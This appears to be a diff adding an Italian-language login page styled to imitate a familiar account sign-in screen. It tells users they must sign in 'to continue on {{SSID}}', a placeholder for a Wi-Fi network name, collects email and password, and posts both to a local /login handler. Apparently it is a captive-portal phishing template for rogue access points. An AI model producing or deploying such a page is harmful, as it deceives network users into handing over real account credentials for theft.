@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Accedi</title>
+<style>
+*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+body{margin:0;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;color:#202124}
+.card{width:380px;max-width:94vw;border:1px solid #dadce0;border-radius:10px;padding:40px 36px}
+.mark{width:46px;height:46px;border-radius:50%;background:#1a73e8;margin:0 auto 14px;
+display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:22px}
+h1{font-size:23px;font-weight:400;text-align:center;margin:0 0 6px}
+p.s{text-align:center;color:#5f6368;font-size:14px;margin:0 0 26px}
+label{display:block;font-size:12px;color:#5f6368;margin:16px 0 5px}
+input{width:100%;padding:13px;border:1px solid #dadce0;border-radius:6px;font-size:15px}
+input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
+.chk{margin-top:16px;font-size:13px;color:#5f6368}
+button{margin-top:24px;width:100%;padding:12px;border:0;border-radius:6px;background:#1a73e8;
+color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+</style></head><body>
+<form class="card" method="POST" action="/login">
+<div class="mark">@</div>
+<h1>Accedi</h1>
+<p class="s">Usa il tuo account per continuare su {{SSID}}</p>
+<label>Email o telefono</label>
+<input name="email" type="text" autocomplete="username" required>
+<label>Password</label>
+<input name="password" type="password" autocomplete="current-password" required>
+<div class="chk"><input type="checkbox" checked style="width:auto"> Resta connesso</div>
+<button type="submit">Avanti</button>
+</form></body></html>
